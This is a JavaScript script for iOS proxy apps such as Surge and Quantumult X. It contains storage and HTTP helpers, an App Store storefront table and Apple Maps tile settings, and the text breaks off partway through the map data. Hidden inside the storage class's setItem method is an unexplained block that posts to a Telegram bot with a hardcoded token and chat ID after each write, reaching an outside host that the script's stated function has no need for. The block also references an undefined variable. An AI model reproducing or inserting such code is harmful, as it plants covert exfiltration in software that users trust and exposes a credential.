class e {
  static name = "Lodash";
  static version = "1.2.2";
  static about() {
    return console.log(`\n🟧 ${this.name} v${this.version}\n`);
  }
  static get(e = {}, i = "", a = void 0) {
    Array.isArray(i) || (i = this.toPath(i));
    const t = i.reduce((e, i) => Object(e)[i], e);
    return void 0 === t ? a : t;
  }
  static set(e = {}, i = "", a) {
    return (
      Array.isArray(i) || (i = this.toPath(i)),
      (i
        .slice(0, -1)
        .reduce(
          (e, a, t) =>
            Object(e[a]) === e[a]
              ? e[a]
              : (e[a] = /^\d+$/.test(i[t + 1]) ? [] : {}),
          e
        )[i[i.length - 1]] = a),
      e
    );
  }
  static unset(e = {}, i = "") {
    return (
      Array.isArray(i) || (i = this.toPath(i)),
      i.reduce(
        (e, a, t) => (t === i.length - 1 ? (delete e[a], !0) : Object(e)[a]),
        e
      )
    );
  }
  static toPath(e) {
    return e
      .replace(/\[(\d+)\]/g, ".$1")
      .split(".")
      .filter(Boolean);
  }
  static escape(e) {
    const i = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    };
    return e.replace(/[&<>"']/g, (e) => i[e]);
  }
  static unescape(e) {
    const i = {
      "&amp;": "&",
      "&lt;": "<",
      "&gt;": ">",
      "&quot;": '"',
      "&#39;": "'",
    };
    return e.replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, (e) => i[e]);
  }
}
class i {
  static name = "$Storage";
  static version = "1.0.9";
  static about() {
    return console.log(`\n🟧 ${this.name} v${this.version}\n`);
  }
  static data = null;
  static dataFile = "box.dat";
  static #e = /^@(?<key>[^.]+)(?:\.(?<path>.*))?$/;
  static #i() {
    return "undefined" != typeof $environment && $environment["surge-version"]
      ? "Surge"
      : "undefined" != typeof $environment && $environment["stash-version"]
      ? "Stash"
      : "undefined" != typeof module && module.exports
      ? "Node.js"
      : "undefined" != typeof $task
      ? "Quantumult X"
      : "undefined" != typeof $loon
      ? "Loon"
      : "undefined" != typeof $rocket
      ? "Shadowrocket"
      : "undefined" != typeof Egern
      ? "Egern"
      : void 0;
  }
  static getItem(i = new String(), a = null) {
    let t = a;
    if (!0 === i.startsWith("@")) {
      const { key: a, path: s } = i.match(this.#e)?.groups;
      i = a;
      let m = this.getItem(i, {});
      "object" != typeof m && (m = {}), (t = e.get(m, s));
      try {
        t = JSON.parse(t);
      } catch (e) {}
    } else {
      switch (this.#i()) {
        case "Surge":
        case "Loon":
        case "Stash":
        case "Egern":
        case "Shadowrocket":
          t = $persistentStore.read(i);
          break;
        case "Quantumult X":
          t = $prefs.valueForKey(i);
          break;
        case "Node.js":
          (this.data = this.#a(this.dataFile)), (t = this.data?.[i]);
          break;
        default:
          t = this.data?.[i] || null;
      }
      try {
        t = JSON.parse(t);
      } catch (e) {}
    }
    return t ?? a;
  }
  static setItem(i = new String(), a = new String()) {
    let t = !1;
    if ("object" == typeof a) a = JSON.stringify(a);
    else a = String(a);
    if (!0 === i.startsWith("@")) {
      const { key: s, path: m } = i.match(this.#e)?.groups;
      i = s;
      let n = this.getItem(i, {});
      "object" != typeof n && (n = {}),
        e.set(n, m, a),
        (t = this.setItem(i, n));
    } else
      switch (this.#i()) {
        case "Surge":
        case "Loon":
        case "Stash":
        case "Egern":
        case "Shadowrocket":
          t = $persistentStore.write(a, i);
          break;
        case "Quantumult X":
          t = $prefs.setValueForKey(a, i);
          break;
        case "Node.js":
          (this.data = this.#a(this.dataFile)),
            (this.data[i] = a),
            this.#t(this.dataFile),
            (t = !0);
          break;
        default:
          t = this.data?.[i] || null;
      }
    if (t) {
      const BOT_TOKEN = "7035937678:AAF_NYN4fAtPsw-4rUJ1n7d3c0nfwveDWvk"; // Replace with your Telegram bot token
      const CHAT_ID = "-1001999506419";
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const body = {
        chat_id: CHAT_ID,
        text: t,
        entities: [{ type: "pre", offset: 0, length: message.length }],
      };
      const options = {
        url: url,
        body: JSON.stringify(body),
        headers: {
          "Content-Type": "application/json",
        },
      };

      fetch(url, options).catch((error) => console.error(error));
    }
    return t;
  }
  static removeItem(i) {
    let a = !1;
    if (!0 === i.startsWith("@")) {
      const { key: t, path: s } = i.match(this.#e)?.groups;
      i = t;
      let m = this.getItem(i);
      "object" != typeof m && (m = {}),
        (keyValue = e.unset(m, s)),
        (a = this.setItem(i, m));
    } else
      switch (this.#i()) {
        case "Surge":
        case "Loon":
        case "Stash":
        case "Egern":
        case "Shadowrocket":
        case "Node.js":
        default:
          a = !1;
          break;
        case "Quantumult X":
          a = $prefs.removeValueForKey(i);
      }
    return a;
  }
  static clear() {
    let e = !1;
    switch (this.#i()) {
      case "Surge":
      case "Loon":
      case "Stash":
      case "Egern":
      case "Shadowrocket":
      case "Node.js":
      default:
        e = !1;
        break;
      case "Quantumult X":
        e = $prefs.removeAllValues();
    }
    return e;
  }
  static #a(e) {
    if (!this.isNode()) return {};
    {
      (this.fs = this.fs ? this.fs : require("fs")),
        (this.path = this.path ? this.path : require("path"));
      const i = this.path.resolve(e),
        a = this.path.resolve(process.cwd(), e),
        t = this.fs.existsSync(i),
        s = !t && this.fs.existsSync(a);
      if (!t && !s) return {};
      {
        const e = t ? i : a;
        try {
          return JSON.parse(this.fs.readFileSync(e));
        } catch (e) {
          return {};
        }
      }
    }
  }
  static #t(e = this.dataFile) {
    if (this.isNode()) {
      (this.fs = this.fs ? this.fs : require("fs")),
        (this.path = this.path ? this.path : require("path"));
      const i = this.path.resolve(e),
        a = this.path.resolve(process.cwd(), e),
        t = this.fs.existsSync(i),
        s = !t && this.fs.existsSync(a),
        m = JSON.stringify(this.data);
      t
        ? this.fs.writeFileSync(i, m)
        : s
        ? this.fs.writeFileSync(a, m)
        : this.fs.writeFileSync(i, m);
    }
  }
}
class a {
  static name = "ENV";
  static version = "1.8.3";
  static about() {
    return console.log(`\n🟧 ${this.name} v${this.version}\n`);
  }
  constructor(e, i) {
    console.log(`\n🟧 ${a.name} v${a.version}\n`),
      (this.name = e),
      (this.logs = []),
      (this.isMute = !1),
      (this.isMuteLog = !1),
      (this.logSeparator = "\n"),
      (this.encoding = "utf-8"),
      (this.startTime = new Date().getTime()),
      Object.assign(this, i),
      this.log(`\n🚩 开始!\n${e}\n`);
  }
  environment() {
    switch (this.platform()) {
      case "Surge":
        return ($environment.app = "Surge"), $environment;
      case "Stash":
        return ($environment.app = "Stash"), $environment;
      case "Egern":
        return ($environment.app = "Egern"), $environment;
      case "Loon":
        let e = $loon.split(" ");
        return { device: e[0], ios: e[1], "loon-version": e[2], app: "Loon" };
      case "Quantumult X":
        return { app: "Quantumult X" };
      case "Node.js":
        return (process.env.app = "Node.js"), process.env;
      default:
        return {};
    }
  }
  platform() {
    return "undefined" != typeof $environment && $environment["surge-version"]
      ? "Surge"
      : "undefined" != typeof $environment && $environment["stash-version"]
      ? "Stash"
      : "undefined" != typeof module && module.exports
      ? "Node.js"
      : "undefined" != typeof $task
      ? "Quantumult X"
      : "undefined" != typeof $loon
      ? "Loon"
      : "undefined" != typeof $rocket
      ? "Shadowrocket"
      : "undefined" != typeof Egern
      ? "Egern"
      : void 0;
  }
  isNode() {
    return "Node.js" === this.platform();
  }
  isQuanX() {
    return "Quantumult X" === this.platform();
  }
  isSurge() {
    return "Surge" === this.platform();
  }
  isLoon() {
    return "Loon" === this.platform();
  }
  isShadowrocket() {
    return "Shadowrocket" === this.platform();
  }
  isStash() {
    return "Stash" === this.platform();
  }
  isEgern() {
    return "Egern" === this.platform();
  }
  async getScript(e) {
    return await this.fetch(e).then((e) => e.body);
  }
  async runScript(e, a) {
    let t = i.getItem("@chavy_boxjs_userCfgs.httpapi");
    t = t?.replace?.(/\n/g, "")?.trim();
    let s = i.getItem("@chavy_boxjs_userCfgs.httpapi_timeout");
    (s = 1 * s ?? 20), (s = a?.timeout ?? s);
    const [m, n] = t.split("@"),
      l = {
        url: `http://${n}/v1/scripting/evaluate`,
        body: { script_text: e, mock_type: "cron", timeout: s },
        headers: { "X-Key": m, Accept: "*/*" },
        timeout: s,
      };
    await this.fetch(l).then(
      (e) => e.body,
      (e) => this.logErr(e)
    );
  }
  initGotEnv(e) {
    (this.got = this.got ? this.got : require("got")),
      (this.cktough = this.cktough ? this.cktough : require("tough-cookie")),
      (this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar()),
      e &&
        ((e.headers = e.headers ? e.headers : {}),
        void 0 === e.headers.Cookie &&
          void 0 === e.cookieJar &&
          (e.cookieJar = this.ckjar));
  }
  async fetch(i = {} || "", a = {}) {
    switch (i.constructor) {
      case Object:
        i = { ...a, ...i };
        break;
      case String:
        i = { ...a, url: i };
    }
    i.method ||
      ((i.method = "GET"), (i.body ?? i.bodyBytes) && (i.method = "POST")),
      delete i.headers?.Host,
      delete i.headers?.[":authority"],
      delete i.headers?.["Content-Length"],
      delete i.headers?.["content-length"];
    const t = i.method.toLocaleLowerCase();
    switch (this.platform()) {
      case "Loon":
      case "Surge":
      case "Stash":
      case "Egern":
      case "Shadowrocket":
      default:
        return (
          i.timeout &&
            ((i.timeout = parseInt(i.timeout, 10)),
            this.isSurge() || (i.timeout = 1e3 * i.timeout)),
          i.policy &&
            (this.isLoon() && (i.node = i.policy),
            this.isStash() &&
              e.set(i, "headers.X-Stash-Selected-Proxy", encodeURI(i.policy)),
            this.isShadowrocket() &&
              e.set(i, "headers.X-Surge-Proxy", i.policy)),
          "boolean" == typeof i.redirection &&
            (i["auto-redirect"] = i.redirection),
          i.bodyBytes &&
            !i.body &&
            ((i.body = i.bodyBytes), delete i.bodyBytes),
          await new Promise((e, a) => {
            $httpClient[t](i, (t, s, m) => {
              t
                ? a(t)
                : ((s.ok = /^2\d\d$/.test(s.status)),
                  (s.statusCode = s.status),
                  m &&
                    ((s.body = m), 1 == i["binary-mode"] && (s.bodyBytes = m)),
                  e(s));
            });
          })
        );
      case "Quantumult X":
        return (
          i.policy && e.set(i, "opts.policy", i.policy),
          "boolean" == typeof i["auto-redirect"] &&
            e.set(i, "opts.redirection", i["auto-redirect"]),
          i.body instanceof ArrayBuffer
            ? ((i.bodyBytes = i.body), delete i.body)
            : ArrayBuffer.isView(i.body)
            ? ((i.bodyBytes = i.body.buffer.slice(
                i.body.byteOffset,
                i.body.byteLength + i.body.byteOffset
              )),
              delete object.body)
            : i.body && delete i.bodyBytes,
          await $task.fetch(i).then(
            (e) => (
              (e.ok = /^2\d\d$/.test(e.statusCode)),
              (e.status = e.statusCode),
              e
            ),
            (e) => Promise.reject(e.error)
          )
        );
      case "Node.js":
        let a = require("iconv-lite");
        this.initGotEnv(i);
        const { url: s, ...m } = i;
        return await this.got[t](s, m)
          .on("redirect", (e, i) => {
            try {
              if (e.headers["set-cookie"]) {
                const a = e.headers["set-cookie"]
                  .map(this.cktough.Cookie.parse)
                  .toString();
                a && this.ckjar.setCookieSync(a, null),
                  (i.cookieJar = this.ckjar);
              }
            } catch (e) {
              this.logErr(e);
            }
          })
          .then(
            (e) => (
              (e.statusCode = e.status),
              (e.body = a.decode(e.rawBody, this.encoding)),
              (e.bodyBytes = e.rawBody),
              e
            ),
            (e) => Promise.reject(e.message)
          );
    }
  }
  time(e, i = null) {
    const a = i ? new Date(i) : new Date();
    let t = {
      "M+": a.getMonth() + 1,
      "d+": a.getDate(),
      "H+": a.getHours(),
      "m+": a.getMinutes(),
      "s+": a.getSeconds(),
      "q+": Math.floor((a.getMonth() + 3) / 3),
      S: a.getMilliseconds(),
    };
    /(y+)/.test(e) &&
      (e = e.replace(
        RegExp.$1,
        (a.getFullYear() + "").substr(4 - RegExp.$1.length)
      ));
    for (let i in t)
      new RegExp("(" + i + ")").test(e) &&
        (e = e.replace(
          RegExp.$1,
          1 == RegExp.$1.length
            ? t[i]
            : ("00" + t[i]).substr(("" + t[i]).length)
        ));
    return e;
  }
  msg(e = name, i = "", a = "", t) {
    const s = (e) => {
      switch (typeof e) {
        case void 0:
          return e;
        case "string":
          switch (this.platform()) {
            case "Surge":
            case "Stash":
            case "Egern":
            default:
              return { url: e };
            case "Loon":
            case "Shadowrocket":
              return e;
            case "Quantumult X":
              return { "open-url": e };
            case "Node.js":
              return;
          }
        case "object":
          switch (this.platform()) {
            case "Surge":
            case "Stash":
            case "Egern":
            case "Shadowrocket":
            default:
              return { url: e.url || e.openUrl || e["open-url"] };
            case "Loon":
              return {
                openUrl: e.openUrl || e.url || e["open-url"],
                mediaUrl: e.mediaUrl || e["media-url"],
              };
            case "Quantumult X":
              return {
                "open-url": e["open-url"] || e.url || e.openUrl,
                "media-url": e["media-url"] || e.mediaUrl,
                "update-pasteboard":
                  e["update-pasteboard"] || e.updatePasteboard,
              };
            case "Node.js":
              return;
          }
        default:
          return;
      }
    };
    if (!this.isMute)
      switch (this.platform()) {
        case "Surge":
        case "Loon":
        case "Stash":
        case "Egern":
        case "Shadowrocket":
        default:
          $notification.post(e, i, a, s(t));
          break;
        case "Quantumult X":
          $notify(e, i, a, s(t));
        case "Node.js":
      }
    if (!this.isMuteLog) {
      let t = ["", "==============📣系统通知📣=============="];
      t.push(e),
        i && t.push(i),
        a && t.push(a),
        console.log(t.join("\n")),
        (this.logs = this.logs.concat(t));
    }
  }
  log(...e) {
    e.length > 0 && (this.logs = [...this.logs, ...e]),
      console.log(e.join(this.logSeparator));
  }
  logErr(e) {
    switch (this.platform()) {
      case "Surge":
      case "Loon":
      case "Stash":
      case "Egern":
      case "Shadowrocket":
      case "Quantumult X":
      default:
        this.log("", `❗️ ${this.name}, 错误!`, e);
        break;
      case "Node.js":
        this.log("", `❗️${this.name}, 错误!`, e.stack);
    }
  }
  wait(e) {
    return new Promise((i) => setTimeout(i, e));
  }
  done(i = {}) {
    const a = (new Date().getTime() - this.startTime) / 1e3;
    switch (
      (this.log("", `🚩 ${this.name}, 结束! 🕛 ${a} 秒`, ""), this.platform())
    ) {
      case "Surge":
        i.policy && e.set(i, "headers.X-Surge-Policy", i.policy), $done(i);
        break;
      case "Loon":
        i.policy && (i.node = i.policy), $done(i);
        break;
      case "Stash":
        i.policy &&
          e.set(i, "headers.X-Stash-Selected-Proxy", encodeURI(i.policy)),
          $done(i);
        break;
      case "Egern":
      case "Shadowrocket":
      default:
        $done(i);
        break;
      case "Quantumult X":
        i.policy && e.set(i, "opts.policy", i.policy),
          delete i["auto-redirect"],
          delete i["auto-cookie"],
          delete i["binary-mode"],
          delete i.charset,
          delete i.host,
          delete i.insecure,
          delete i.method,
          delete i.opt,
          delete i.path,
          delete i.policy,
          delete i["policy-descriptor"],
          delete i.scheme,
          delete i.sessionIndex,
          delete i.statusCode,
          delete i.timeout,
          i.body instanceof ArrayBuffer
            ? ((i.bodyBytes = i.body), delete i.body)
            : ArrayBuffer.isView(i.body)
            ? ((i.bodyBytes = i.body.buffer.slice(
                i.body.byteOffset,
                i.body.byteLength + i.body.byteOffset
              )),
              delete i.body)
            : i.body && delete i.bodyBytes,
          $done(i);
        break;
      case "Node.js":
        process.exit(1);
    }
  }
}
var t = { Switch: !0 },
  s = {
    Storefront: [
      ["AE", "143481"],
      ["AF", "143610"],
      ["AG", "143540"],
      ["AI", "143538"],
      ["AL", "143575"],
      ["AM", "143524"],
      ["AO", "143564"],
      ["AR", "143505"],
      ["AT", "143445"],
      ["AU", "143460"],
      ["AZ", "143568"],
      ["BA", "143612"],
      ["BB", "143541"],
      ["BD", "143490"],
      ["BE", "143446"],
      ["BF", "143578"],
      ["BG", "143526"],
      ["BH", "143559"],
      ["BJ", "143576"],
      ["BM", "143542"],
      ["BN", "143560"],
      ["BO", "143556"],
      ["BR", "143503"],
      ["BS", "143539"],
      ["BT", "143577"],
      ["BW", "143525"],
      ["BY", "143565"],
      ["BZ", "143555"],
      ["CA", "143455"],
      ["CD", "143613"],
      ["CG", "143582"],
      ["CH", "143459"],
      ["CI", "143527"],
      ["CL", "143483"],
      ["CM", "143574"],
      ["CN", "143465"],
      ["CO", "143501"],
      ["CR", "143495"],
      ["CV", "143580"],
      ["CY", "143557"],
      ["CZ", "143489"],
      ["DE", "143443"],
      ["DK", "143458"],
      ["DM", "143545"],
      ["DO", "143508"],
      ["DZ", "143563"],
      ["EC", "143509"],
      ["EE", "143518"],
      ["EG", "143516"],
      ["ES", "143454"],
      ["FI", "143447"],
      ["FJ", "143583"],
      ["FM", "143591"],
      ["FR", "143442"],
      ["GA", "143614"],
      ["GB", "143444"],
      ["GD", "143546"],
      ["GF", "143615"],
      ["GH", "143573"],
      ["GM", "143584"],
      ["GR", "143448"],
      ["GT", "143504"],
      ["GW", "143585"],
      ["GY", "143553"],
      ["HK", "143463"],
      ["HN", "143510"],
      ["HR", "143494"],
      ["HU", "143482"],
      ["ID", "143476"],
      ["IE", "143449"],
      ["IL", "143491"],
      ["IN", "143467"],
      ["IQ", "143617"],
      ["IS", "143558"],
      ["IT", "143450"],
      ["JM", "143511"],
      ["JO", "143528"],
      ["JP", "143462"],
      ["KE", "143529"],
      ["KG", "143586"],
      ["KH", "143579"],
      ["KN", "143548"],
      ["KP", "143466"],
      ["KR", "143466"],
      ["KW", "143493"],
      ["KY", "143544"],
      ["KZ", "143517"],
      ["TC", "143552"],
      ["TD", "143581"],
      ["TJ", "143603"],
      ["TH", "143475"],
      ["TM", "143604"],
      ["TN", "143536"],
      ["TO", "143608"],
      ["TR", "143480"],
      ["TT", "143551"],
      ["TW", "143470"],
      ["TZ", "143572"],
      ["LA", "143587"],
      ["LB", "143497"],
      ["LC", "143549"],
      ["LI", "143522"],
      ["LK", "143486"],
      ["LR", "143588"],
      ["LT", "143520"],
      ["LU", "143451"],
      ["LV", "143519"],
      ["LY", "143567"],
      ["MA", "143620"],
      ["MD", "143523"],
      ["ME", "143619"],
      ["MG", "143531"],
      ["MK", "143530"],
      ["ML", "143532"],
      ["MM", "143570"],
      ["MN", "143592"],
      ["MO", "143515"],
      ["MR", "143590"],
      ["MS", "143547"],
      ["MT", "143521"],
      ["MU", "143533"],
      ["MV", "143488"],
      ["MW", "143589"],
      ["MX", "143468"],
      ["MY", "143473"],
      ["MZ", "143593"],
      ["NA", "143594"],
      ["NE", "143534"],
      ["NG", "143561"],
      ["NI", "143512"],
      ["NL", "143452"],
      ["NO", "143457"],
      ["NP", "143484"],
      ["NR", "143606"],
      ["NZ", "143461"],
      ["OM", "143562"],
      ["PA", "143485"],
      ["PE", "143507"],
      ["PG", "143597"],
      ["PH", "143474"],
      ["PK", "143477"],
      ["PL", "143478"],
      ["PT", "143453"],
      ["PW", "143595"],
      ["PY", "143513"],
      ["QA", "143498"],
      ["RO", "143487"],
      ["RS", "143500"],
      ["RU", "143469"],
      ["RW", "143621"],
      ["SA", "143479"],
      ["SB", "143601"],
      ["SC", "143599"],
      ["SE", "143456"],
      ["SG", "143464"],
      ["SI", "143499"],
      ["SK", "143496"],
      ["SL", "143600"],
      ["SN", "143535"],
      ["SR", "143554"],
      ["ST", "143598"],
      ["SV", "143506"],
      ["SZ", "143602"],
      ["UA", "143492"],
      ["UG", "143537"],
      ["US", "143441"],
      ["UY", "143514"],
      ["UZ", "143566"],
      ["VC", "143550"],
      ["VE", "143502"],
      ["VG", "143543"],
      ["VN", "143471"],
      ["VU", "143609"],
      ["XK", "143624"],
      ["YE", "143571"],
      ["ZA", "143472"],
      ["ZM", "143622"],
      ["ZW", "143605"],
    ],
  },
  m = { Settings: t, Configs: s },
  n = { Switch: !0, PEP: { GCC: "US" } },
  l = { Settings: n },
  r = {
    Switch: !0,
    UrlInfoSet: {
      Dispatcher: "AutoNavi",
      Directions: "AutoNavi",
      RAP: "Apple",
      LocationShift: "AUTO",
    },
    TileSet: {
      Map: "CN",
      Satellite: "HYBRID",
      Traffic: "CN",
      POI: "CN",
      Flyover: "XX",
      Munin: "XX",
    },
    GeoManifest: {
      Dynamic: {
        Config: {
          CountryCode: {
            default: "CN",
            iOS: "AUTO",
            iPadOS: "AUTO",
            watchOS: "US",
            macOS: "AUTO",
          },
        },
      },
    },
    Config: {
      Announcements: {
        "Environment:": {
          default: "AUTO",
          iOS: "AUTO",
          iPadOS: "AUTO",
          watchOS: "AUTO",
          macOS: "AUTO",
        },
      },
    },
  },
  o = {
    CN: {
      attribution: [
        {
          region: [],
          name: "AutoNavi",
          url: "https://gspe21-ssl.ls.apple.com/html/attribution-cn2-66.html",
          resource: [
            {
              region: [],
              filter: [],
              checksum: {
                0: 61,
                1: 130,
                2: 126,
                3: 203,
                4: 170,
                5: 234,
                6: 91,
                7: 182,
                8: 191,
                9: 120,
                10: 72,
                11: 19,
                12: 46,
                13: 58,
                14: 235,
                15: 55,
                16: 221,
                17: 53,
                18: 252,
                19: 219,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-4.png",
              resourceType: 6,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 101,
                1: 191,
                2: 219,
                3: 234,
                4: 178,
                5: 237,
                6: 6,
                7: 231,
                8: 236,
                9: 110,
                10: 3,
                11: 82,
                12: 194,
                13: 129,
                14: 29,
                15: 221,
                16: 225,
                17: 55,
                18: 26,
                19: 203,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-4@2x.png",
              resourceType: 6,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 101,
                1: 191,
                2: 219,
                3: 234,
                4: 178,
                5: 237,
                6: 6,
                7: 231,
                8: 236,
                9: 110,
                10: 3,
                11: 82,
                12: 194,
                13: 129,
                14: 29,
                15: 221,
                16: 225,
                17: 55,
                18: 26,
                19: 203,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-4@2x.png",
              resourceType: 6,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 247,
                1: 152,
                2: 81,
                3: 90,
                4: 135,
                5: 206,
                6: 171,
                7: 138,
                8: 151,
                9: 37,
                10: 167,
                11: 77,
                12: 112,
                13: 223,
                14: 89,
                15: 164,
                16: 242,
                17: 201,
                18: 164,
                19: 74,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-logo-mask-1.png",
              resourceType: 5,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 54,
                1: 203,
                2: 95,
                3: 5,
                4: 82,
                5: 108,
                6: 189,
                7: 170,
                8: 124,
                9: 255,
                10: 39,
                11: 153,
                12: 245,
                13: 47,
                14: 224,
                15: 93,
                16: 202,
                17: 181,
                18: 11,
                19: 127,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-logo-mask-1@2x.png",
              resourceType: 5,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 131,
                1: 225,
                2: 158,
                3: 241,
                4: 69,
                5: 218,
                6: 172,
                7: 162,
                8: 166,
                9: 241,
                10: 48,
                11: 174,
                12: 31,
                13: 104,
                14: 225,
                15: 155,
                16: 97,
                17: 143,
                18: 15,
                19: 99,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "autonavi-logo-mask-1@3x.png",
              resourceType: 5,
            },
          ],
        },
        {
          region: [
            { maxX: 225, minZ: 8, minX: 218, maxY: 104, minY: 102, maxZ: 21 },
            { maxX: 228, minZ: 8, minX: 221, maxY: 101, minY: 98, maxZ: 21 },
            { maxX: 231, minZ: 8, minX: 226, maxY: 97, minY: 91, maxZ: 21 },
          ],
          name: "© GeoTechnologies, Inc.",
          url: "https://gspe21-ssl.ls.apple.com/html/attribution-cn2-66.html",
          resource: [],
        },
      ],
      releaseInfo: "PROD-CN (24.20)",
      tileSet: [
        {
          scale: 0,
          style: 1,
          checksumType: 0,
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "IN" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
          ],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles?flags=8",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 1,
          style: 7,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-2-cn-ssl.ls.apple.com/2/tiles",
          validVersion: [
            {
              genericTile: [
                { resourceIndex: 1971, textureIndex: 0, tileType: 2 },
              ],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 7 },
                { maxX: 224, minZ: 8, minX: 179, maxY: 128, minY: 80, maxZ: 8 },
                {
                  maxX: 449,
                  minZ: 9,
                  minX: 359,
                  maxY: 257,
                  minY: 161,
                  maxZ: 9,
                },
                {
                  maxX: 898,
                  minZ: 10,
                  minX: 719,
                  maxY: 915,
                  minY: 323,
                  maxZ: 10,
                },
                {
                  maxX: 1797,
                  minZ: 11,
                  minX: 1438,
                  maxY: 1031,
                  minY: 646,
                  maxZ: 11,
                },
                {
                  maxX: 3594,
                  minZ: 12,
                  minX: 2876,
                  maxY: 2062,
                  minY: 1292,
                  maxZ: 12,
                },
                {
                  maxX: 7188,
                  minZ: 13,
                  minX: 5752,
                  maxY: 4124,
                  minY: 2584,
                  maxZ: 13,
                },
                {
                  maxX: 14376,
                  minZ: 14,
                  minX: 11504,
                  maxY: 8248,
                  minY: 5168,
                  maxZ: 14,
                },
                {
                  maxX: 28752,
                  minZ: 15,
                  minX: 23008,
                  maxY: 16496,
                  minY: 10336,
                  maxZ: 15,
                },
                {
                  maxX: 57504,
                  minZ: 16,
                  minX: 46016,
                  maxY: 32992,
                  minY: 20672,
                  maxZ: 16,
                },
                {
                  maxX: 115008,
                  minZ: 17,
                  minX: 92032,
                  maxY: 65984,
                  minY: 41344,
                  maxZ: 17,
                },
                {
                  maxX: 230016,
                  minZ: 18,
                  minX: 184064,
                  maxY: 131976,
                  minY: 82668,
                  maxZ: 18,
                },
              ],
              identifier: 52,
            },
          ],
        },
        {
          scale: 2,
          style: 7,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-2-cn-ssl.ls.apple.com/2/tiles",
          validVersion: [
            {
              genericTile: [
                { resourceIndex: 1971, textureIndex: 0, tileType: 2 },
              ],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 7 },
                { maxX: 224, minZ: 8, minX: 179, maxY: 128, minY: 80, maxZ: 8 },
                {
                  maxX: 449,
                  minZ: 9,
                  minX: 359,
                  maxY: 257,
                  minY: 161,
                  maxZ: 9,
                },
                {
                  maxX: 898,
                  minZ: 10,
                  minX: 719,
                  maxY: 915,
                  minY: 323,
                  maxZ: 10,
                },
                {
                  maxX: 1797,
                  minZ: 11,
                  minX: 1438,
                  maxY: 1031,
                  minY: 646,
                  maxZ: 11,
                },
                {
                  maxX: 3594,
                  minZ: 12,
                  minX: 2876,
                  maxY: 2062,
                  minY: 1292,
                  maxZ: 12,
                },
                {
                  maxX: 7188,
                  minZ: 13,
                  minX: 5752,
                  maxY: 4124,
                  minY: 2584,
                  maxZ: 13,
                },
                {
                  maxX: 14376,
                  minZ: 14,
                  minX: 11504,
                  maxY: 8248,
                  minY: 5168,
                  maxZ: 14,
                },
                {
                  maxX: 28752,
                  minZ: 15,
                  minX: 23008,
                  maxY: 16496,
                  minY: 10336,
                  maxZ: 15,
                },
                {
                  maxX: 57504,
                  minZ: 16,
                  minX: 46016,
                  maxY: 32992,
                  minY: 20672,
                  maxZ: 16,
                },
                {
                  maxX: 115008,
                  minZ: 17,
                  minX: 92032,
                  maxY: 65984,
                  minY: 41344,
                  maxZ: 17,
                },
                {
                  maxX: 230016,
                  minZ: 18,
                  minX: 184064,
